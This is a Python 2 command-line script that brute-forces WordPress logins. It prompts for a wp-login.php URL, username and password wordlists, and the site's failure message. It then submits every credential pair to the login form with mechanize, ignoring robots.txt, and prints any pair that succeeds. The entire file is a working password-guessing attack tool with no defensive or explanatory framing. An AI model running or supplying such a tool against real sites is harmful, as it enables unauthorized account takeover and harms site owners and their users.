import sys

end = '\033[0m'
yellow = '\033[33m'
red="\033[0;31m"
green="\033[0;32m"
brown="\033[0;33m"
blue="\033[0;34m"
pur="\033[0;35m" 

def __start__():
	try:
		import mechanize
	except ImportError:
		print
		print red+"[-] Not found 'mechanize' library"+end
		print green+"    pip install mechanize"+end
		print
		sys.exit()
	print
	print green+"[+] Please enter url wordpress login"
	print "    e.x: [http, https]://example.com/wp-login.php"+end
	print
	url = raw_input(brown+'wordpress_brute > url >>> '+end)
	print
	print green+"[+] Please enter username list"
	print "    e.x: user.txt"+end
	print
	user_file = raw_input(brown+'wordpress_brute > userFile >>> '+end)
	print
	print green+"[+] Please enter password list"
	print "    e.x: pass.txt"+end
	print
	pass_file = raw_input(brown+'wordpress_brute > passFile >>> '+end)
	print
	print green+"[+] Please enter text error"
	print "    e.x: Error, username is unknow"
	print
	error_text = raw_input(brown+'wordpress_brute > Error >>> '+end)
	try:
		userO = open(user_file, 'r')
		user_word = userO.readlines()
		userO.close()
	except IOError:
		print
		print red,"[-] Not cant open username file: ",user_file,end
		print
		sys.exit()
	try:
		passO = open(pass_file, 'r')
		pass_word = passO.readlines()
		passO.close()
	except IOError:
		print
		print red,"[-] Not cant open password file: ",pass_file,end
		print
		sys.exit()

	try:
		br = mechanize.Browser()
		br.set_handle_robots(False)
		br.addheaders = [("User-agent", 'Firefox')]
		br.open(url)
	except:
		print
		print red,"[-] Not found url wordpress login: ",url,end
		print
		sys.exit()
	
	for password in pass_word:
		password = password.strip()
		for username in user_word:
			username = username.strip()
			
			print brown+"Try: "+end
			print brown+"    username: ",green,username,end
			print brown+"    password: ",green,password,end
			
			br = mechanize.Browser()
			br.set_handle_robots(False)
			br.addheaders = [("User-agent", 'Firefox')]
			br.open(url)
			br.select_form(id="loginform")
			br["log"] = username
			br["pwd"] = password
			res = br.submit()
			
			if error_text in res.read():
				pass
			else:
				print
				print green+"[+] Founded!"+end
				print
				print brown+" url: ",green,url,end
				print brown+" username: ",green,username,end
				print brown+" password: ",green,password,end
				print
				sys.exit()
			